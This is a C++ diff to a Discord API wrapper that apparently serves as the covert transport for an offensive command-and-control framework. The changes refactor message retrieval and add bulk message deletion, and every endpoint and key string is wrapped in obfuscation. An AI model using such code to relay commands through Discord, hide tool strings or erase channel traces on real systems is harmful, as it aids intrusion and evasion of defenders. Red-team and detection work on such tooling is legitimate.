@@ -54,7 +54,6 @@ std::string FSecure::Discord::WriteMessage(std::string const& text)
 	return output[OBF("id")].get<std::string>(); //return the timestamp so a reply can be viewed
 }
 
-
 std::map<std::string, std::string> FSecure::Discord::ListChannels()
 {
 	std::map<std::string, std::string> channelMap;
@@ -71,8 +70,6 @@ std::map<std::string, std::string> FSecure::Discord::ListChannels()
 
 	return channelMap;
 }
-
-
 
 std::string FSecure::Discord::CreateChannel(std::string const& channelName)
 {
@@ -95,67 +92,26 @@ std::string FSecure::Discord::CreateChannel(std::string const& channelName)
 	return channels[channelName];
 }
 
-
-std::vector<std::pair<std::string, std::string>> FSecure::Discord::ReadReplies(std::string const& messageId)
+json FSecure::Discord::GetAllMessages()
 {
-	std::vector<std::pair<std::string, std::string>> ret;
 	std::string url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId + OBF("/messages?limit=100");
 	int retrieve_count = 100;
 	int message_count;
+	json all_messages;
 
 	do {
-		auto& messages = GetJsonResponse(url);
-		message_count = (int)messages.size();
-		if (message_count > 0) {
-			for (auto& reply : messages)
-			{
-				if (reply.contains(OBF("message_reference"))) {
-					auto id = reply[OBF("message_reference")][OBF("message_id")].get<std::string>();
-					if (id == messageId) {
-						std::string text;
-						if (!reply[OBF("attachments")].empty()) //the reply contains a file, handle this differently
-						{
-							std::string fileUrl = reply[OBF("attachments")][0][OBF("url")].get<std::string>();
-							text = GetFile(fileUrl);
-						}
-						else
-							text = reply[OBF("content")].get<std::string>();
-						ret.emplace_back(std::move(reply[OBF("id")]), std::move(text));
-					}
-				}
-			}
-			auto last_message_id = messages[message_count - 1][OBF("id")].get<std::string>();
-			url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId + OBF("/messages?limit=100&before=") + last_message_id;
-		}
-	} while (message_count == retrieve_count); // if we're asking for up to 100 messages and we get back 100, we'll check for more.
-
-	return ret;
-}
-
-std::vector<std::string>  FSecure::Discord::GetMessagesByDirection(std::string const& direction)
-{
-	std::vector<std::string> ret;
-	std::string url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId + OBF("/messages?limit=100");
-	int retrieve_count = 100;
-	int message_count;
-
-	do {
-		auto& messages = GetJsonResponse(url);
+		json messages = GetJsonResponse(url);
 		message_count = (int)messages.size();
 		if (message_count > 0) {
 			for (auto& m : messages)
 			{
-				std::string_view data = m[OBF("content")].get<std::string_view>();
-				//make sure it's a message we care about
-				if (data == direction)
-					ret.emplace_back(m[OBF("id")].get<std::string>());
+				all_messages.emplace_back(m);
 			}
 			auto last_message_id = messages[message_count - 1][OBF("id")].get<std::string>();
 			url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId + OBF("/messages?limit=100&before=") + last_message_id;
 		}
 	} while (message_count == retrieve_count); // if we're asking for up to 100 messages and we get back 100, we'll check for more.
-
-	return ret;
+	return all_messages;
 }
 
 void FSecure::Discord::UpdateMessage(std::string const& message, std::string const& messageId)
@@ -185,13 +141,38 @@ void FSecure::Discord::DeleteMessage(std::string const& messageId)
 	SendHttpRequest(url, ContentType::ApplicationJson, {}, Method::DEL);
 }
 
-
 void FSecure::Discord::DeleteChannel()
 {
 	std::string url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId;
 	SendHttpRequest(url, ContentType::ApplicationJson, {}, Method::DEL);
 }
 
+void FSecure::Discord::DeleteMessages(std::vector<std::string> const& replyIds)
+{
+	if (replyIds.size() == 1) // The bulk delete method requires at least two messages so use alternative API
+		DeleteMessage(replyIds[0]);
+	else
+	{
+		std::string delete_url = OBF("https://discord.com/api/v9/channels/") + this->m_channelId + OBF("/messages/bulk-delete");
+		json j;
+		j[OBF("messages")];
+
+		for (auto& id : replyIds)
+		{
+			if ((j[OBF("messages")].size() > 1) and (j[OBF("messages")].size() % 100 == 0)) {
+				std::string data = j.dump();
+				SendHttpRequest(delete_url, ContentType::ApplicationJson, { std::make_move_iterator(data.begin()), std::make_move_iterator(data.end()) }, Method::POST);
+				j[OBF("messages")] = {};
+			}
+			j[OBF("messages")].emplace_back(id);
+		}
+
+		if (j[OBF("messages")].size() != 0) {
+			std::string data = j.dump();
+			SendHttpRequest(delete_url, ContentType::ApplicationJson, { std::make_move_iterator(data.begin()), std::make_move_iterator(data.end()) }, Method::POST);
+		}
+	}
+}
 
 void FSecure::Discord::DeleteAllMessages()
 {
@@ -220,8 +201,6 @@ void FSecure::Discord::DeleteAllMessages()
 }
 
 
-
-
 FSecure::ByteVector FSecure::Discord::SendHttpRequest(std::string const& host, ContentType contentType, std::vector<uint8_t> const& data, Method method) {
 	return SendHttpRequest(host, GetContentType(contentType), data, method);
 }
@@ -236,26 +215,24 @@ FSecure::ByteVector FSecure::Discord::SendHttpRequest(std::string const& host, s
 		if (!data.empty()) {
 			request.SetData(contentType, data);
 		}
+
+		std::cout << host << std::endl;
+
 		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));
 		request.SetHeader(Header::Authorization, OBF(L"Bot ") + ToWideString(this->m_Token));
 
 		auto resp = webClient.Request(request);
 
-		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
+		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
 			return resp.GetData();
-		}
-		else if (resp.GetStatusCode() == StatusCode::NoContent){
+		else if (resp.GetStatusCode() == StatusCode::NoContent)
 			return {};
-		}
-		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict) {
+		else if (resp.GetStatusCode() == StatusCode::TooManyRequests || resp.GetStatusCode() == StatusCode::Conflict)
 			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
-		}
-		else {
+		else
 			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
-		}
 	}
 }
-
 
 json FSecure::Discord::SendJsonRequest(std::string const& url, json const& data, Method method) {
 
@@ -269,7 +246,6 @@ json FSecure::Discord::SendJsonRequest(std::string const& url, json const& data,
 		return resp;
 	}
 }
-
 
 json FSecure::Discord::GetJsonResponse(std::string const& url)
 {
